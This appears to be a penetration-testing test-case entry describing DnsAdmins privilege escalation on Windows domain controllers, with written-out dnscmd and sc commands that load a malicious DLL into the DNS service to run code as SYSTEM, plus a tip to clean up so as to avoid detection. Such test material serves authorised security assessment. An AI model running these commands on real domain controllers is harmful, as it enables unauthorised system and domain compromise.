---
testcase: Exploit membership in the DnsAdmins group to execute code as NT AUTHORITY\SYSTEM by configuring a custom DLL via dnscmd and restarting the DNS service
platforms:
  - AD
  - Windows
methodology:
  - BlackBox
  - GreyBox
references:
  - https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DNSAdmins/DNSAdmins.md
  - https://www.tenable.com/indicators/ioa/I-DnsAdmins
attack_types:
  - PrivEsc
how-to-test: |
  **Enumeration:**
  1. Confirm you are a member of the DnsAdmins group:
     - Run `whoami /groups` or `net group DnsAdmins /DOMAIN`.
  2. Ensure you are on a Domain Controller running the Microsoft DNS service.
  3. Verify that dnscmd.exe is available.
  4. Identify a location to drop a custom DLL accessible by the DNS service.
  
  **Exploitation:**
  5. Prepare a malicious DLL that executes your payload.
  6. Upload the DLL to a location accessible by the DNS service, for example:
     - `\\<domaincontroller>\C$\Windows\System32\dns\evil.dll`
  7. Configure the DNS service to load your DLL using dnscmd:
     - `dnscmd <DC_HOSTNAME> /config /serverlevelplugindll \\<domaincontroller>\C$\Windows\System32\dns\evil.dll`
  8. Restart the DNS service to load the DLL:
     - `sc \\<DC_HOSTNAME> stop dns`
     - `sc \\<DC_HOSTNAME> start dns`
  9. Verify SYSTEM-level access by confirming your payload’s output (e.g., a reverse shell or log entry).

Key Points:
  - DnsAdmins can configure DNS server plugins, which can be abused for SYSTEM code execution.
  - Exploitation on a Domain Controller can lead to lateral movement or domain dominance.
  - Clean up any malicious configurations after exploitation to minimize detection.
---